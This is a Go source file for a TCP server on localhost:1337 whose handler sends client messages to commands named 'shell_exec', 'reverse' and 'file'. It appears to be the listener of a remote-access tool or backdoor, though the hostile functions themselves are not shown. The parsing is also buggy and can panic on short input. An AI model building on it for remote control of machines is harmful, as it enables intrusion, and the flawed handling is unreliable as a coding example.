package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
)

const (
	connHost = "localhost"
	connPort = "1337"
	connType = "tcp"
)

func main() {
	address := connHost + ":" + connPort

	fmt.Println("Starting", connType, "server on", address)

	l, err := net.Listen(connType, address)

	if err != nil {
		fmt.Println("Error:", err.Error())
		os.Exit(1)
	}
	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			fmt.Println("Error:", err.Error())
			os.Exit(1)
		}
		fmt.Println("Client", c.RemoteAddr().String(), "connected.")

		go handleConnection(c)
	}
}

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadBytes('\000')
	fmt.Println(buffer)
	buffer = buffer[:len(buffer)-1]
	fmt.Println(buffer)

	if err != nil {
		fmt.Println("Connection closed.")
		conn.Close()
		return
	}

	if string(buffer[0]) == "W" {
		buffer = buffer[1 : len(buffer)-2]
	} else {
		buffer = buffer[:len(buffer)-1]
	}

	log.Println("Client message:", string(buffer))

	if string(buffer) == "exit" {
		log.Println("Connection closed.")
		conn.Write([]byte(onExit(conn)))
		conn.Close()
		return
	}

	var info string
	if len(buffer) > 0 {
		if string(buffer[:4]) == "file" {
			info = string(buffer[4:])
			buffer = buffer[:4]
		}
	}

	switch string(buffer) {
	case "shell_exec":
		conn.Write([]byte(shellExec(conn)))
	case "whichos":
		conn.Write([]byte(checkOS()))
	case "reverse":
		conn.Write([]byte(openReverse()))
	case "file":
		conn.Write([]byte(wFile([]byte(info))))
	default:
		conn.Write([]byte("Command not found.\n"))
	}

	fmt.Println("Despues, despues")
	fmt.Println(buffer)

	handleConnection(conn)
}
